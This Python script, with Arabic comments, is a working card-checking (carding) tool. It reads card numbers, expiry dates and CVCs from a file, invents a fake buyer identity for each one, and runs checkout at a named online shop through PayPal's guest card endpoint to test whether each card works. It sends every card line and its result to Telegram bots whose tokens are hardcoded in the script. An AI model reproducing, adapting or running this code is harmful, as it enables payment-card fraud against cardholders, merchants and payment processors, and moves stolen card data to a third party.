import os
import sys
import subprocess
import requests
import re
import random
import string

# دالة تثبيت المكتبات المطلوبة
def install_required_packages():
    """تثبيت المكتبات المطلوبة تلقائياً"""
    required_packages = [
        'requests',
        'requests-toolbelt'
    ]
    
    python_exe = sys.executable
    
    for package in required_packages:
        try:
            # محاولة استيراد المكتبة للتحقق من وجودها
            if package == 'requests-toolbelt':
                __import__('requests_toolbelt')
            else:
                __import__(package)
            print(f"✅ {package} مثبتة بالفعل")
        except ImportError:
            print(f"⚠️  جاري تثبيت {package}...")
            try:
                subprocess.check_call(
                    [python_exe, "-m", "pip", "install", package],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"✅ تم تثبيت {package} بنجاح")
            except subprocess.CalledProcessError:
                print(f"❌ فشل في تثبيت {package}")
                return False
    return True

# التحقق من المكتبات المطلوبة
if install_required_packages():
    try:
        from requests_toolbelt.multipart.encoder import MultipartEncoder
        print("✅ جميع المكتبات جاهزة للاستخدام")
    except ImportError as e:
        print(f"❌ خطأ في تحميل المكتبات: {e}")
        sys.exit(1)
else:
    print("❌ فشل في تثبيت المكتبات المطلوبة")
    sys.exit(1)

# باقي الكود...
token2 = '8344387029:AAF-11nXTGcK78KjiYagIN0eYI6V6co1iLc'
token1 = '8587397539:AAGDTkm2tjcLq_FXPW4GaC1L7cqquG_p0CI'
Id = 7759095500

def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]
    
    city_index = random.randint(0, len(cities) - 1)
    return cities[city_index], states[city_index], f"{random.randint(1, 999)} {random.choice(streets)}", zip_codes[city_index]

def generate_random_account():
    return f"{''.join(random.choices(string.ascii_lowercase, k=20))}{''.join(random.choices(string.digits, k=4))}@gmail.com"

def generate_phone_number():
    return f"303{''.join(random.choices(string.digits, k=7))}"

def process_single_payment(n, mm, yy, cvc):
    try:
        r = requests.Session()
        
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        num = generate_phone_number()
        
        
        
        files = {'quantity': (None, '1'), 'add-to-cart': (None, '4451')}
        multipart_data = MultipartEncoder(fields=files)
        
        headers = {
            'content-type': multipart_data.content_type,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, timeout=30)
        
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        response = r.get('https://switchupcb.com/checkout/', timeout=30)
        
        sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
        nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1)
        check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
        create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
        
        data = f'security={sec}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={street_address}&address_2=&s_country=US&s_state={state}&s_postcode={zip_code}&s_city={city}&s_address={street_address}&s_address_2=&has_full_address=true'
        r.post('https://switchupcb.com/', params={'wc-ajax': 'update_order_review'}, data=data, timeout=30)
        
        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}',
            'createaccount': False,
            'save_payment_method': False,
        }
        
        response = r.post('https://switchupcb.com/', params={'wc-ajax': 'ppc-create-order'}, json=json_data, timeout=30)
        paypal_id = response.json()['data']['id']
        
        session_id = f'uid_{"".join(random.choices(string.ascii_lowercase + string.digits, k=10))}_{"".join(random.choices(string.ascii_lowercase + string.digits, k=11))}'
        
        r.get('https://www.paypal.com/smart/card-fields', params={'sessionID': session_id, 'buttonSessionID': session_id, 'token': paypal_id}, timeout=30)
        
        json_data = {
            'query': '''
        mutation payWithCard($token: String!, $card: CardInput!, $firstName: String, $lastName: String, $billingAddress: AddressInput, $email: String) {
            approveGuestPaymentWithCreditCard(token: $token, card: $card, firstName: $firstName, lastName: $lastName, billingAddress: $billingAddress, email: $email) {
                flags { is3DSecureRequired }
            }
        }''',
            'variables': {
                'token': paypal_id,
                'card': {
                    'cardNumber': n,
                    'expirationDate': f'{mm}/20{yy}',
                    'postalCode': zip_code,
                    'securityCode': cvc,
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': street_address,
                    'city': city,
                    'state': state,
                    'postalCode': zip_code,
                    'country': 'US',
                },
                'email': acc,
            },
        }
        
        response = r.post('https://www.paypal.com/graphql?fetch_credit_form_submit', json=json_data)
        return response.text
        
    except Exception as e:
        return f"Error: {str(e)}"

# التحقق من وجود ملف البطاقات
try:
    file = open('qq.txt', "r")
except FileNotFoundError:
    print("❌ ملف qq.txt غير موجود")
    sys.exit(1)

start_num = 0

for P in file.readlines():
    start_num += 1
    P = P.strip()
    if '|' in P:
        parts = P.split('|')
        if len(parts) >= 4:
            cc, mm, yy, cvc = parts[0], parts[1], parts[2][-2:], parts[3]
            
            result = process_single_payment(cc, mm, yy, cvc)
            zxa = (f'{result[:100]}')
            last = zxa
            ua = zxa
            print(zxa)
            if 'is3DSecureRequired' in ua:
            	tp = (f'''Approved ✅\n
ϟ Card -» {P}
ϟ Gateway -» Braintree Auth3
ϟ Response -» {ua}
ϟ Status -»  Approved! ♻️
ϟ Result -» Charged 0.01$
''')
            	requests.get("https://api.telegram.org/bot"+str(token2)+"/sendMessage?chat_id="+str(Id)+"&text="+str(tp))
            if 'INVALID_SECURITY_CODE' in ua:
            	tp = (f'''Approved ✅\n
ϟ Card -» {P}
ϟ Gateway -» Braintree Auth3
ϟ Response -» {ua}
ϟ Status -»  Approved! ♻️
ϟ Result -» Charged 0.01$
''')
            	requests.get("https://api.telegram.org/bot"+str(token2)+"/sendMessage?chat_id="+str(Id)+"&text="+str(tp))
            if 'EXISTING_ACCOUNT_RESTRICTED' in ua:
            	tp = (f'''Approved ✅\n
ϟ Card -» {P}
ϟ Gateway -» Braintree Auth3
ϟ Response -» {ua}
ϟ Status -»  Approved! ♻️
ϟ Result -» Charged 0.01$
''')
            	requests.get("https://api.telegram.org/bot"+str(token2)+"/sendMessage?chat_id="+str(Id)+"&text="+str(tp))
            if ('ADD_SHIPPING_ERROR' in last or 'NEED_CREDIT_CARD' in last or '"status": "succeeded"' in last or 
            'Thank You For Donation.' in last or 'Your payment has already been processed' in last or 'Success ' in last):
            	result = 'CHARGE 2$ ✅'
            	tp = (f'''Approved ✅\n
ϟ Card -» {P}
ϟ Gateway -» Braintree Auth3
ϟ Response -» {ua}
ϟ Status -»  Approved! ♻️
ϟ Result -» Charged 0.01$
''')
            	requests.get("https://api.telegram.org/bot"+str(token2)+"/sendMessage?chat_id="+str(Id)+"&text="+str(tp))
            else:
            	tp = (f'''Approved ✅\n
ϟ Card -» {P}
ϟ Gateway -» Braintree Auth3
ϟ Response -» {ua}
ϟ Status -»  Approved! ♻️
ϟ Result -» Charged 0.01$
''')
            	requests.get("https://api.telegram.org/bot"+str(token1)+"/sendMessage?chat_id="+str(Id)+"&text="+str(tp))

file.close()